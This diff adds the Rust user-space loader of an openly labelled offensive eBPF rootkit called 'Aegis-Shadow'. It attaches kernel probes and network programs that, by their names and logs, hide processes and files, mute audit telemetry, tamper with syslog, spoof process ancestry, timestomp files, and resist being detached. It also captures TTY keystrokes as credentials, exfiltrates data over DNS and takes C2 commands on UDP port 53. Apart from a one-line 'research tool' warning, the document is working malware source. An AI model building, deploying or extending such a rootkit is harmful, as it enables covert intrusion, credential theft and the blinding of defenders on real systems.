@@ -1,0 +1,495 @@
+use anyhow::{Context, Result};
+use aya::{
+    include_bytes_aligned,
+    maps::{HashMap, PerfEventArray},
+    programs::{KProbe, Xdp, XdpFlags, TracePoint, tc::{SchedClassifier, TcAttachType}},
+    Bpf, Btf,
+};
+use aya_log::BpfLogger;
+use clap::Parser;
+use common::{
+    RootkitConfig, EventHeader, CredentialCapture, DnsExfilChunk, TimestompEntry,
+    EVENT_PROC_HIDDEN, EVENT_PACKET_INTERCEPTED, EVENT_FILE_OBFUSCATED,
+    EVENT_CRED_CAPTURED, EVENT_LOG_TAMPERED, EVENT_ANCESTRY_SPOOFED,
+    EVENT_DNS_EXFIL, EVENT_KALLSYMS_HIDDEN, EVENT_ANTI_DETACH,
+    EVENT_TIMESTOMPED, EVENT_C2_AUTH_FAILED, EVENT_TELEMETRY_MUTED,
+    BPF_PIN_PATH,
+};
+use log::{info, warn, error, debug};
+use std::fs;
+use std::path::Path;
+use tokio::signal;
+use tokio::time::{sleep, Duration};
+
+#[derive(Debug, Parser)]
+#[command(name = "aegis-shadow-offense")]
+#[command(about = "Aegis-Shadow Offensive Rootkit Loader", long_about = None)]
+struct Cli {
+    /// Network interface to attach XDP program
+    #[arg(short, long, default_value = "eth0")]
+    iface: String,
+
+    /// Enable verbose logging
+    #[arg(short, long)]
+    verbose: bool,
+
+    /// Hide specific PID on startup
+    #[arg(long)]
+    hide_pid: Option<u32>,
+
+    /// Obfuscate file by inode
+    #[arg(long)]
+    obfuscate_inode: Option<u64>,
+
+    /// Monitor TTY device (major:minor format, e.g., 136:0)
+    #[arg(long)]
+    monitor_tty: Option<String>,
+
+    /// Spoof PPID for target PID (format: pid:fake_ppid)
+    #[arg(long)]
+    spoof_ppid: Option<String>,
+
+    /// Mark inode for timestomping (format: inode:atime:mtime:ctime)
+    #[arg(long)]
+    timestomp: Option<String>,
+
+    /// Pin BPF maps to filesystem for persistence
+    #[arg(long)]
+    pin_maps: bool,
+}
+
+#[tokio::main]
+async fn main() -> Result<()> {
+    let cli = Cli::parse();
+
+    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or(
+        if cli.verbose { "debug" } else { "info" }
+    ))
+    .init();
+
+    // Bump the memlock rlimit for eBPF
+    let rlim = libc::rlimit {
+        rlim_cur: libc::RLIM_INFINITY,
+        rlim_max: libc::RLIM_INFINITY,
+    };
+    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
+    if ret != 0 {
+        warn!("Failed to increase RLIMIT_MEMLOCK");
+    }
+
+    info!("🔥 Aegis-Shadow Offensive Rootkit Starting...");
+    info!("⚠️  WARNING: This is a research tool. Use responsibly and legally.");
+
+    // Load eBPF bytecode
+    #[cfg(debug_assertions)]
+    let mut bpf = Bpf::load(include_bytes_aligned!(
+        "../../target/bpfel-unknown-none/debug/offense"
+    ))?;
+    #[cfg(not(debug_assertions))]
+    let mut bpf = Bpf::load(include_bytes_aligned!(
+        "../../target/bpfel-unknown-none/release/offense"
+    ))?;
+
+    // Load BTF if available
+    if let Ok(btf) = Btf::from_sys_fs() {
+        info!("✓ BTF loaded from /sys/kernel/btf/vmlinux");
+    } else {
+        warn!("⚠ BTF not available - CO-RE features may not work");
+    }
+
+    // Initialize BPF logger
+    if let Err(e) = BpfLogger::init(&mut bpf) {
+        warn!("Failed to initialize eBPF logger: {}", e);
+    }
+
+    // Configure rootkit
+    let self_pid = std::process::id();
+    let config = RootkitConfig {
+        self_pid,
+        flags: 0xFFFFFFFF, // All features enabled
+    };
+
+    let mut config_map: HashMap<_, u32, RootkitConfig> =
+        HashMap::try_from(bpf.map_mut("CONFIG").context("CONFIG map not found")?)?;
+    config_map.insert(0u32, config, 0)?;
+    info!("✓ Rootkit configured (self_pid={})", self_pid);
+
+    // Pin maps if requested
+    if cli.pin_maps {
+        pin_all_maps(&mut bpf)?;
+        info!("✓ Maps pinned to {}", BPF_PIN_PATH);
+    }
+
+    // Load Feature 1: Process Hiding (getdents64)
+    let getdents_enter: &mut KProbe = bpf
+        .program_mut("shadow_getdents64_enter")
+        .context("shadow_getdents64_enter not found")?
+        .try_into()?;
+    getdents_enter.load()?;
+    getdents_enter.attach("__x64_sys_getdents64", 0)?;
+
+    let getdents_exit: &mut KProbe = bpf
+        .program_mut("shadow_getdents64_exit")
+        .context("shadow_getdents64_exit not found")?
+        .try_into()?;
+    getdents_exit.load()?;
+    getdents_exit.attach("__x64_sys_getdents64", 0)?;
+    info!("✓ Feature 1: Process Hiding (getdents64) loaded");
+
+    // Load Feature 2: Network Stealth (XDP)
+    let xdp_prog: &mut Xdp = bpf
+        .program_mut("shadow_xdp")
+        .context("shadow_xdp not found")?
+        .try_into()?;
+    xdp_prog.load()?;
+    xdp_prog.attach(&cli.iface, XdpFlags::default())?;
+    info!("✓ Feature 2: Network Stealth (XDP) attached to {}", cli.iface);
+
+    // Load Feature 3: File Obfuscation (vfs_read)
+    let vfs_read: &mut KProbe = bpf
+        .program_mut("shadow_vfs_read")
+        .context("shadow_vfs_read not found")?
+        .try_into()?;
+    vfs_read.load()?;
+    vfs_read.attach("vfs_read", 0)?;
+    info!("✓ Feature 3: File Obfuscation (vfs_read) loaded");
+
+    // Load Feature 4: Telemetry Muting (audit hooks)
+    let audit_syscall: &mut KProbe = bpf
+        .program_mut("shadow_mute_audit")
+        .context("shadow_mute_audit not found")?
+        .try_into()?;
+    audit_syscall.load()?;
+    if let Err(e) = audit_syscall.attach("audit_log_start", 0) {
+        warn!("⚠ Failed to attach audit_log_start: {} (audit may not be enabled)", e);
+    } else {
+        info!("✓ Feature 4: Telemetry Muting (audit) loaded");
+    }
+
+    let audit_log_end: &mut KProbe = bpf
+        .program_mut("shadow_mute_audit_log_end")
+        .context("shadow_mute_audit_log_end not found")?
+        .try_into()?;
+    audit_log_end.load()?;
+    if let Err(e) = audit_log_end.attach("audit_log_end", 0) {
+        warn!("⚠ Failed to attach audit_log_end: {}", e);
+    }
+
+    // Load Feature 6: Credential Harvesting (sys_write on TTY)
+    let cred_harvest: &mut KProbe = bpf
+        .program_mut("shadow_cred_harvest")
+        .context("shadow_cred_harvest not found")?
+        .try_into()?;
+    cred_harvest.load()?;
+    cred_harvest.attach("ksys_write", 0)?;
+    info!("✓ Feature 6: Credential Harvesting (ksys_write) loaded");
+
+    // Load Feature 7: Log Tampering (do_syslog)
+    let log_tamper_enter: &mut KProbe = bpf
+        .program_mut("shadow_tamper_logs_enter")
+        .context("shadow_tamper_logs_enter not found")?
+        .try_into()?;
+    log_tamper_enter.load()?;
+    log_tamper_enter.attach("do_syslog", 0)?;
+
+    let log_tamper_exit: &mut KProbe = bpf
+        .program_mut("shadow_tamper_logs")
+        .context("shadow_tamper_logs not found")?
+        .try_into()?;
+    log_tamper_exit.load()?;
+    log_tamper_exit.attach("do_syslog", 0)?;
+    info!("✓ Feature 7: Log Tampering (do_syslog) loaded");
+
+    // Load Feature 8: Process Ancestry Spoofing (vfs_read on /proc/[pid]/status)
+    let spoof_ancestry: &mut KProbe = bpf
+        .program_mut("shadow_spoof_ancestry")
+        .context("shadow_spoof_ancestry not found")?
+        .try_into()?;
+    spoof_ancestry.load()?;
+    spoof_ancestry.attach("vfs_read", 0)?;
+    info!("✓ Feature 8: Process Ancestry Spoofing (vfs_read) loaded");
+
+    // Load Feature 9: DNS Exfiltration (TC egress)
+    let tc_prog: &mut SchedClassifier = bpf
+        .program_mut("shadow_dns_exfil")
+        .context("shadow_dns_exfil not found")?
+        .try_into()?;
+    tc_prog.load()?;
+    tc_prog.attach(&cli.iface, TcAttachType::Egress)?;
+    info!("✓ Feature 9: DNS Exfiltration (TC egress) attached to {}", cli.iface);
+
+    // Load Feature 10: Kallsyms Hiding (vfs_read on /proc/kallsyms)
+    let hide_kallsyms: &mut KProbe = bpf
+        .program_mut("shadow_hide_kallsyms")
+        .context("shadow_hide_kallsyms not found")?
+        .try_into()?;
+    hide_kallsyms.load()?;
+    hide_kallsyms.attach("vfs_read", 0)?;
+    info!("✓ Feature 10: Kallsyms Hiding (vfs_read) loaded");
+
+    // Load Feature 11: Anti-Detach Self-Defense (bpf tracepoint)
+    let anti_detach: &mut TracePoint = bpf
+        .program_mut("shadow_anti_detach")
+        .context("shadow_anti_detach not found")?
+        .try_into()?;
+    anti_detach.load()?;
+    anti_detach.attach("syscalls", "sys_enter_bpf")?;
+    info!("✓ Feature 11: Anti-Detach Self-Defense (tracepoint) loaded");
+
+    // Load Feature 13: Timestomping (vfs_getattr)
+    let timestomp_enter: &mut KProbe = bpf
+        .program_mut("shadow_timestomp_enter")
+        .context("shadow_timestomp_enter not found")?
+        .try_into()?;
+    timestomp_enter.load()?;
+    timestomp_enter.attach("vfs_getattr", 0)?;
+
+    let timestomp_exit: &mut KProbe = bpf
+        .program_mut("shadow_timestomp")
+        .context("shadow_timestomp not found")?
+        .try_into()?;
+    timestomp_exit.load()?;
+    timestomp_exit.attach("vfs_getattr", 0)?;
+    info!("✓ Feature 13: Timestomping (vfs_getattr) loaded");
+
+    // Apply CLI configurations
+    if let Some(pid) = cli.hide_pid {
+        let mut hidden_pids: HashMap<_, u32, u8> =
+            HashMap::try_from(bpf.map_mut("HIDDEN_PIDS")?)?;
+        hidden_pids.insert(pid, 1u8, 0)?;
+        info!("✓ Hiding PID: {}", pid);
+    }
+
+    if let Some(inode) = cli.obfuscate_inode {
+        let mut obfuscate_inodes: HashMap<_, u64, u8> =
+            HashMap::try_from(bpf.map_mut("OBFUSCATE_INODES")?)?;
+        obfuscate_inodes.insert(inode, 1u8, 0)?;
+        info!("✓ Obfuscating inode: {}", inode);
+    }
+
+    if let Some(tty) = cli.monitor_tty {
+        if let Some((major, minor)) = parse_tty_device(&tty) {
+            let dev_key = ((major as u64) << 32) | (minor as u64);
+            let mut monitored_ttys: HashMap<_, u64, u8> =
+                HashMap::try_from(bpf.map_mut("MONITORED_TTYS")?)?;
+            monitored_ttys.insert(dev_key, 1u8, 0)?;
+            info!("✓ Monitoring TTY: {} ({}:{})", tty, major, minor);
+        } else {
+            warn!("⚠ Invalid TTY format: {}", tty);
+        }
+    }
+
+    if let Some(spoof) = cli.spoof_ppid {
+        if let Some((pid, fake_ppid)) = parse_spoof_ppid(&spoof) {
+            let mut spoofed_ppids: HashMap<_, u32, u32> =
+                HashMap::try_from(bpf.map_mut("SPOOFED_PPIDS")?)?;
+            spoofed_ppids.insert(pid, fake_ppid, 0)?;
+            info!("✓ Spoofing PPID: {} → {}", pid, fake_ppid);
+        } else {
+            warn!("⚠ Invalid spoof format: {}", spoof);
+        }
+    }
+
+    if let Some(ts) = cli.timestomp {
+        if let Some((inode, entry)) = parse_timestomp(&ts) {
+            let mut timestomp_inodes: HashMap<_, u64, TimestompEntry> =
+                HashMap::try_from(bpf.map_mut("TIMESTOMP_INODES")?)?;
+            timestomp_inodes.insert(inode, entry, 0)?;
+            info!("✓ Timestomping inode: {}", inode);
+        } else {
+            warn!("⚠ Invalid timestomp format: {}", ts);
+        }
+    }
+
+    // Start event monitoring
+    tokio::spawn(monitor_events(bpf));
+
+    info!("🚀 Rootkit active. Press Ctrl+C to detach and exit.");
+    info!("📡 Listening for C2 commands on UDP port 53...");
+
+    // Wait for Ctrl+C
+    signal::ctrl_c().await?;
+
+    info!("🛑 Shutting down...");
+    Ok(())
+}
+
+fn pin_all_maps(bpf: &mut Bpf) -> Result<()> {
+    let pin_path = Path::new(BPF_PIN_PATH);
+    if !pin_path.exists() {
+        fs::create_dir_all(pin_path)?;
+    }
+
+    for (name, map) in bpf.maps_mut() {
+        let map_path = pin_path.join(name);
+        if let Err(e) = map.pin(&map_path) {
+            warn!("Failed to pin map {}: {}", name, e);
+        }
+    }
+
+    Ok(())
+}
+
+async fn monitor_events(mut bpf: Bpf) {
+    let mut events: PerfEventArray<_> = match bpf.map_mut("EVENTS") {
+        Ok(map) => match PerfEventArray::try_from(map) {
+            Ok(perf) => perf,
+            Err(e) => {
+                error!("Failed to get EVENTS perf array: {}", e);
+                return;
+            }
+        },
+        Err(e) => {
+            error!("Failed to get EVENTS map: {}", e);
+            return;
+        }
+    };
+
+    let mut cred_events: PerfEventArray<_> = match bpf.map_mut("CRED_EVENTS") {
+        Ok(map) => match PerfEventArray::try_from(map) {
+            Ok(perf) => perf,
+            Err(e) => {
+                error!("Failed to get CRED_EVENTS perf array: {}", e);
+                return;
+            }
+        },
+        Err(e) => {
+            error!("Failed to get CRED_EVENTS map: {}", e);
+            return;
+        }
+    };
+
+    let cpus = aya::util::online_cpus().unwrap_or_else(|_| vec![0]);
+    let mut event_buffers = Vec::new();
+    let mut cred_buffers = Vec::new();
+
+    for cpu in cpus.iter() {
+        if let Ok(buf) = events.open(*cpu, None) {
+            event_buffers.push(buf);
+        }
+        if let Ok(buf) = cred_events.open(*cpu, None) {
+            cred_buffers.push(buf);
+        }
+    }
+
+    info!("📊 Event monitoring started on {} CPUs", cpus.len());
+
+    loop {
+        sleep(Duration::from_millis(100)).await;
+
+        // Process general events
+        for buf in event_buffers.iter_mut() {
+            while let Ok(events) = buf.read_events(&mut []) {
+                for event_data in events {
+                    if event_data.len() >= std::mem::size_of::<EventHeader>() {
+                        let event = unsafe {
+                            std::ptr::read(event_data.as_ptr() as *const EventHeader)
+                        };
+                        log_event(&event);
+                    }
+                }
+            }
+        }
+
+        // Process credential capture events
+        for buf in cred_buffers.iter_mut() {
+            while let Ok(events) = buf.read_events(&mut []) {
+                for event_data in events {
+                    if event_data.len() >= std::mem::size_of::<CredentialCapture>() {
+                        let capture = unsafe {
+                            std::ptr::read(event_data.as_ptr() as *const CredentialCapture)
+                        };
+                        log_credential_capture(&capture);
+                    }
+                }
+            }
+        }
+    }
+}
+
+fn log_event(event: &EventHeader) {
+    match event.event_type {
+        EVENT_PROC_HIDDEN => {
+            debug!("🙈 Process hidden: PID={}", event.pid);
+        }
+        EVENT_PACKET_INTERCEPTED => {
+            debug!("📦 C2 packet intercepted: cmd_type={}, arg={}", event.pid, event.context);
+        }
+        EVENT_FILE_OBFUSCATED => {
+            debug!("📄 File obfuscated: PID={}, inode={}", event.pid, event.context);
+        }
+        EVENT_LOG_TAMPERED => {
+            debug!("📝 Log tampered: PID={}, bytes={}", event.pid, event.context);
+        }
+        EVENT_ANCESTRY_SPOOFED => {
+            debug!("👪 Ancestry spoofed: PID={}, fake_ppid={}", event.pid, event.context);
+        }
+        EVENT_DNS_EXFIL => {
+            debug!("🌐 DNS exfiltration: seq={}", event.context);
+        }
+        EVENT_KALLSYMS_HIDDEN => {
+            debug!("🔍 Kallsyms hidden: PID={}, inode={}", event.pid, event.context);
+        }
+        EVENT_ANTI_DETACH => {
+            debug!("🛡️ Detach attempt blocked: PID={}, cmd={}", event.pid, event.context);
+        }
+        EVENT_TIMESTOMPED => {
+            debug!("⏰ Timestamp spoofed: PID={}, inode={}", event.pid, event.context);
+        }
+        EVENT_C2_AUTH_FAILED => {
+            warn!("⚠️ C2 authentication failed: encrypted={}", event.context);
+        }
+        EVENT_TELEMETRY_MUTED => {
+            debug!("🔇 Telemetry muted: PID={}", event.pid);
+        }
+        _ => {
+            debug!("❓ Unknown event: type={}", event.event_type);
+        }
+    }
+}
+
+fn log_credential_capture(capture: &CredentialCapture) {
+    let data_str = String::from_utf8_lossy(&capture.data[..capture.data_len as usize]);
+    info!("🔑 Credential captured: PID={}, FD={}, data={:?}", 
+          capture.pid, capture.fd, data_str);
+}
+
+fn parse_tty_device(s: &str) -> Option<(u32, u32)> {
+    let parts: Vec<&str> = s.split(':').collect();
+    if parts.len() != 2 {
+        return None;
+    }
+    let major = parts[0].parse::<u32>().ok()?;
+    let minor = parts[1].parse::<u32>().ok()?;
+    Some((major, minor))
+}
+
+fn parse_spoof_ppid(s: &str) -> Option<(u32, u32)> {
+    let parts: Vec<&str> = s.split(':').collect();
+    if parts.len() != 2 {
+        return None;
+    }
+    let pid = parts[0].parse::<u32>().ok()?;
+    let fake_ppid = parts[1].parse::<u32>().ok()?;
+    Some((pid, fake_ppid))
+}
+
+fn parse_timestomp(s: &str) -> Option<(u64, TimestompEntry)> {
+    let parts: Vec<&str> = s.split(':').collect();
+    if parts.len() != 4 {
+        return None;
+    }
+    let inode = parts[0].parse::<u64>().ok()?;
+    let atime = parts[1].parse::<u64>().ok()?;
+    let mtime = parts[2].parse::<u64>().ok()?;
+    let ctime = parts[3].parse::<u64>().ok()?;
+    
+    Some((inode, TimestompEntry {
+        fake_atime_sec: atime,
+        fake_mtime_sec: mtime,
+        fake_ctime_sec: ctime,
+        _pad: 0,
+    }))
+}
+
+// Made with Bob
